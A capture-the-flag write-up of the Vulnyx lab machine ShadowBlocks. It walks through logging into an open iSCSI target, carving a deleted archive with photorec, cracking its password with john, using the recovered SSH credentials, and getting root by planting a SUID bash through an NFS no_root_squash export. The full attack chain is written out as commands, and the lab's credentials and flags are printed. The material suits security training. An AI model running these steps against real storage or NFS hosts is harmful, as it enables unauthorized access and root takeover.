# Vulnyx: ShadowBlocks

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `Lenam` |
| **Tools used** | `nmap` · `iscsiadm` · `dd` · `photorec` · `7z2john` · `john` · `7z` · `hydra` · `ssh` |
| **Tags** | `#iSCSI` `#DiskForensics` `#FileCarving` `#NFS` `#no_root_squash` |
| **URL** | https://vulnyx.com/machines/ |

An open iSCSI target is discovered and mounted directly as a local block device. Imaging it and running `photorec` over the raw data recovers a password-protected 7z archive that was deleted at some point, holding a set of SSH credentials. Root comes from a classic NFS `no_root_squash` misconfiguration: a locally mounted NFS export lets a SUID root binary be planted from the attacker's own machine and then executed from the target.

## Enumeration

### Port Scanning

A full TCP port scan is run first:

```bash
sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn shadowblocks.nyx

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
3260/tcp open  iscsi   syn-ack ttl 64
MAC Address: 08:00:27:F8:17:45 (Oracle VirtualBox virtual NIC)
```

Two ports are found open: **22 (SSH)** and **3260**, the standard port for iSCSI. A version/script scan against both fills in the details:

```bash
sudo nmap -p 22,3260 -sVC shadowblock.nyx

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
3260/tcp open  iscsi   Synology DSM iSCSI
| iscsi-info:
|   iqn.2026-02.nyx.shadowblocks:storage.disk1:
|     Address: 10.0.2.36:3260,1
|_    Authentication: NOT required
MAC Address: 08:00:27:F8:17:45 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel10
```

### iSCSI Discovery and Login

Rather than a typical web/SSH box, port 3260 points to an iSCSI target — a way of exposing a raw block device over the network. `iscsiadm` is used to discover what's being shared:

```bash
sudo iscsiadm -m discovery -t sendtargets -p shadowblock.nyx
shadowblock.nyx:3260,1 iqn.2026-02.nyx.shadowblocks:storage.disk1
```

The discovered target is logged into, which attaches it locally as if it were a physical disk:

```bash
sudo iscsiadm -m node --targetname="iqn.2026-02.nyx.shadowblocks:storage.disk1" -p shadowblock.nyx:3260 --login
Login to [iface: default, target: iqn.2026-02.nyx.shadowblocks:storage.disk1, portal: shadowblock.nyx:3260] --login] successful.
```

```bash
sudo fdisk -l
Disk /dev/sda: 80.09 GiB, 86000000000 bytes, 167968750 sectors
Disk model: VBOX HARDDISK
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0xf5d8db42

Device     Boot Start       End   Sectors  Size Id Type
/dev/sda1  *     2048 167968749 167966702 80.1G 83 Linux


Disk /dev/sdb: 150 MiB, 157286400 bytes, 307200 sectors
Disk model: shadowblocks
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 8388608 bytes
Disklabel type: dos
Disk identifier: 0x2566cb3e

Device     Boot Start    End Sectors Size Id Type
/dev/sdb1        2048 307199  305152 149M 83 Linux
```

## Initial Access

### Mounting and Imaging the Disk

The new partition is mounted first to see what's on it directly:

```bash
sudo mount /dev/sdb1 ~/Vulnyx/Easy/ShadowBlocks
mount: /home/kali/Vulnyx/Easy/ShadowBlocks: WARNING: source write-protected, mounted read-only.

ls -l Vulnyx/Easy/ShadowBlocks
total 20499
drwxrwxr-x 2 root root     1024 Feb 28 12:51 backups
drwxrwxr-x 2 root root     1024 Feb 28 12:51 configs
drwxrwxr-x 2 root root     1024 Feb 28 12:50 docs
drwxrwxr-x 2 root root     1024 Feb 28 12:51 engineering
drwxrwxr-x 2 root root     1024 Feb 28 12:51 finance
drwxrwxr-x 2 root root     1024 Feb 28 12:51 hr
drwxrwxr-x 2 root root     1024 Feb 28 12:51 logs
drwx------ 2 root root    12288 Feb 28 12:49 lost+found
-rw-rw-r-- 1 root root 20971520 Feb 28 12:49 random_fill.bin
```

Instead of continuing through the mounted filesystem, the whole device is imaged raw, to recover anything that might have been deleted:

```bash
sudo umount ~/Vulnyx/Easy/ShadowBlocks
```
```bash
sudo dd if=/dev/sdb1 of=iscsi.img bs=4M status=progress
125829120 bytes (126 MB, 120 MiB) copied, 1 s, 119 MB/s
37+1 records in
37+1 records out
156237824 bytes (156 MB, 149 MiB) copied, 1.16145 s, 135 MB/s
```

### File Carving with PhotoRec

`photorec` scans the raw image at the byte level for recognizable file signatures, independent of the filesystem's own metadata — which is what makes it useful for recovering files a normal directory listing wouldn't show:

```bash
sudo photorec iscsi.img
PhotoRec 7.2, Data Recovery Utility, February 2024
Christophe GRENIER <grenier@cgsecurity.org>
https://www.cgsecurity.org
```

### Loot: A Password-Protected 7z Archive

Among the recovered files is a password-protected archive. Its hash is extracted and cracked:

```bash
7z2john recup_dir.1/f0018434.7z > file_1.hash
```
```bash
john file_1.hash /usr/share/wordlists/rockyou.txt
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 6 candidates buffered for the current salt, minimum 16 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst
donald           (f0018434.7z)
1g 0:00:16:39 DONE 2/3 (2026-06-30 11:43)  0.001000g/s 8.078p/s 8.078c/s 8.078C/s  summer..maggi
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> **Archive password:** `donald`

```bash
7z e recup_dir.1/f0018434.7z
```
```bash
ls -l
total 25
drwxrwxr-x  2 kali kali 4096 Jun  3 09:43 Admin
-rw-r--r--  1 kali kali  338 Feb 28 12:39 credentials.txt
-rw-rw-r--  1 kali kali  336 Jun 30 11:22 file_1.hash
drwxrwxr-x  2 kali kali 4096 Jun  5 10:46 Hosting
drwxr-xr-x  2 root root 4096 Jun 30 11:17 recup_dir.1
drwxr-xr-x 10 root root 1024 Feb 28 12:52 ShadowBlocks
drwxrwxr-x  2 kali kali 4096 Jun 30 11:04 War
```
```bash
cat credentials.txt
ShadowBlocks Internal Access Credentials

──────────────────────────────

System: Primary Storage Node
Environment: Production
Access Level: Administrative

Username: lenam
Password: 3vEbN3bM6NhOa1640weG

Note:
This file is intended for temporary migration procedures only.
It must be deleted after use.
Last reviewed: 2026-02-15
```

> **Credentials:** `lenam:3vEbN3bM6NhOa1640weG`

### Shell as lenam

The credentials are validated against SSH:

```bash
hydra -l lenam -p '3vEbN3bM6NhOa1640weG' ssh://shadowblocks.nyx
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secr
et purposes (this is non-binding, these ** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-30 11:41:24
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to red
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://shadowblocks.nyx:22/
[22][ssh] host: shadowblocks.nyx   login: lenam   password: 3vEbN3bM6NhOa1640weG
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-30 11:41:25
```

They check out, and a connection follows:

```bash
ssh lenam@shadowblocks.nyx
lenam@shadowblocks.nyx's password:
Linux shadowblocks 6.12.73+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.73-1 (2026-02-17) x8

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar  1 17:17:49 2026 from 192.168.1.5
lenam@shadowblocks:~$ id
uid=1000(lenam) gid=1000(lenam) grupos=1000(lenam),24(cdrom),25(floppy),29(audio),30(dip),44(v)
lenam@shadowblocks:~$ ls -l /home/lenam/
total 4
-r-------- 1 lenam lenam 33 feb 28 02:32 user.txt
lenam@shadowblocks:~$ cat user.txt
c94a424cb23a6b53b235511a01a9a443
```
> **User flag:** `c94a424cb23a6b53b235511a01a9a443`

## Privilege Escalation

### NFS `no_root_squash` via Port Forwarding

```bash
lenam@shadowblocks:~$ ss -tulnp
tcp     LISTEN   0    4096                    0.0.0.0:2049
tcp     LISTEN   0    4096                    [::]:56681
tcp     LISTEN   0    4096                    [::]:40465
tcp     LISTEN   0    4096                    [::]:111
tcp     LISTEN   0    128                     [::]:22
tcp     LISTEN   0    4096                    [::]:2049
tcp     LISTEN   0    4096                    [::]:33289
v_str   LISTEN   0    0                       *:22
```

An NFS service (port 2049) is listening, but only on `127.0.0.1` — reachable from the box itself, not from outside. An SSH local port forward exposes it on the attacker's own machine instead:

```bash
ssh -L 2049:127.0.0.1:2049 lenam@shadowblocks.nyx
```

*(Missing step here: the forwarded export still needs to be mounted locally, e.g. `sudo mount -t nfs -o vers=3 127.0.0.1:/srv/nfs ~/Vulnyx/Easy/nfs`, before the commands below make sense — worth adding once confirmed.)*

If the NFS export is configured with `no_root_squash`, the server trusts the UID a client presents — including root. Mounting it locally as root and creating a SUID-root binary there means that binary keeps root ownership and its SUID bit when the *target* box later accesses the same underlying storage:

```bash
sudo cp /bin/bash ~/Vulnyx/Easy/nfs/bashroot
sudo chmod u+s ~/Vulnyx/Easy/nfs/bashroot
```

Back on the target, the same file is now reachable through the local NFS mount path and already carries the SUID bit set from the attacker's side:

```bash
lenam@shadowblocks:~$ /srv/nfs/bashroot -p
bashroot-5.3# id
uid=1000(lenam) gid=1000(lenam) euid=0(root) grupos=1000(lenam),24(cdrom),25(floppy),29(audio
s),101(netdev)
bashroot-5.3# ls -l /root
total 4
-r-------- 1 root root 33 feb 28 02:34 root.txt
bashroot-5.3# cat /root/root.txt
402482f61c16a59f688d36d5134f97d1
```

> **Root flag:** `402482f61c16a59f688d36d5134f97d1`

## Takeaways

- iSCSI exposes a raw block device, not a filesystem with permissions — anything readable at the block level bypasses whatever access control the filesystem on top of it would normally enforce.
- Deleting a file doesn't remove its data from disk immediately; tools like `photorec` recover content by scanning for file signatures directly, independent of what the filesystem's own directory listing shows.
- `no_root_squash` on an NFS export is effectively a root-equivalence bridge between the client and the server: anything a client's root user creates on the mount keeps root ownership (SUID bit included) on the server side too.